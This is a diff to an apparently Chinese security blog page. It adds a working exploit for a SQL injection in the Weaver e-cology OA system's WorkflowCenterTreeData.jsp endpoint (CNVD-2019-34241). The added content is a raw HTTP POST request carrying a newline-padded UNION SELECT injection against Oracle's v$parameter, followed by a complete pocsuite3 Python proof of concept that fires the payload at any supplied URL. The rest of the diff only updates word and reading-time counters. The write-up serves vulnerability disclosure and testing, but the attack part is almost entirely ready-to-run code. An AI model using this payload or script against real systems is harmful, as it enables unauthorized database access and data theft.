@@ -433,14 +433,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        143
+                        2.2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        13 分
                     </div>
                     
                 
@@ -464,7 +464,114 @@
 <p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191010155307.png" alt></p>
 <h1 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>直接抓包，使用payload请求</p>
 <p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191010155058.png" alt></p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-34241" target="_blank" rel="noopener">泛微e-cology OA系统Wo***接口存在SQL注入漏洞</a></p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1
+Host: ip:port
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2236
+Connection: close
+
+Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#! python3
+&quot;&quot;&quot;
+
+@FileName: e_cology_oa_workflow_sqli.py.py
+@Author: dylan
+@software: PyCharm 
+@Datetime: 2019-10-10 15:05
+
+&quot;&quot;&quot;
+
+from pocsuite3.api import Output, POCBase, register_poc, requests, logger
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+class DemoPOC(POCBase):
+    vulID = &quot;&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = &quot;3.0&quot;  # 默认为1
+    author = &quot;dylan&quot;  # PoC作者的大名
+    vulDate = &quot;2019/10/10&quot;  # 漏洞公开的时间,不知道就写今天
+    createDate = &quot;2019/10/10&quot;  # 编写 PoC 的日期
+    updateDate = &quot;2019/10/10&quot;  # PoC 更新的时间,默认和编写时间一样
+    references = [&quot;&quot;]  # 漏洞地址来源,0day不用写
+    name = &quot;e_cology_oa_workflow_sqli&quot;  # PoC 名称
+    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址
+    appName = &quot;泛微e-cology OA&quot;  # 漏洞应用名称
+    appVersion = &quot;&quot;  # 漏洞影响版本
+    vulType = &quot;sqli&quot;  # 漏洞类型,类型参考见 漏洞类型规范表
+    desc = &quot;&quot;&quot;
+        只影响Oracle数据库
+    &quot;&quot;&quot;  # 漏洞简要描述
+    samples = [&quot;&quot;]  # 测试样列,就是用 PoC 测试成功的网站
+    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    pocDesc = &quot;&quot;&quot;
+
+    &quot;&quot;&quot;
+
+    def _verify(self):
+        # 验证代码
+        result = {}
+        headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0&quot;,
+                   &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,&quot;
+                             &quot;application/xml;q=0.9,*/*;q=0.8&quot;,
+                   &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;,
+                   &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+                   &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+                   &quot;Connection&quot;: &quot;close&quot;,
+                   &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
+        data = &quot;formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \
+               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \
+               &quot;%0dunion select NULL,value from v$parameter order by (((1 &quot;
+
+        path = &quot;/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333&quot;
+        url = self.url + path
+        # print(url)
+        respose = requests.post(url, data=data, headers=headers, verify=False, timeout=60)
+        if respose.status_code == 200 and &quot;id&quot; in respose.text:  # result是返回结果
+            result[&#39;VerifyInfo&#39;] = {}
+            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url
+            # result[&#39;VerifyInfo&#39;][&#39;content&#39;] = respose.text
+        return self.parse_output(result)
+
+    def _attack(self):
+        # 攻击代码
+        return self._verify()
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail(&quot;Internet nothing returned&quot;)
+        return output
+
+
+# 注册 DemoPOC 类
+register_poc(DemoPOC)
+</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-34241" target="_blank" rel="noopener">泛微e-cology OA系统Wo***接口存在SQL注入漏洞</a></p>
 
             </div>
             <hr/>
@@ -1204,7 +1311,7 @@ iwconfig
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">20.6k</span>
+                <span class="white-color">22.8k</span>
             
 
             
